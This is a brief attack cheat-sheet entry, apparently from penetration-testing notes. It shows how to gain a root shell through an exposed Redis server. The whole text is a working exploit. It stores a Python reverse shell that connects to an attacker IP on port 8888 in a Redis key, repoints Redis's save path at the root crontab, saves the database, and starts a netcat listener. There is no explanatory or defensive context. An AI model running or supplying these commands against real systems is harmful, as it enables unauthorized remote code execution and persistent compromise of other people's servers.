# Cron job

```bash
# Kali
# Change IP address and port number
echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.119.128\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 192.168.90.69 -x set 1

redis-cli -h 192.168.90.69  config set dir /var/spool/cron/crontabs/
redis-cli -h 192.168.90.69  config set dbfilename root	
redis-cli -h 192.168.90.69  save

# Kali 
nc -nvlp 8888
```
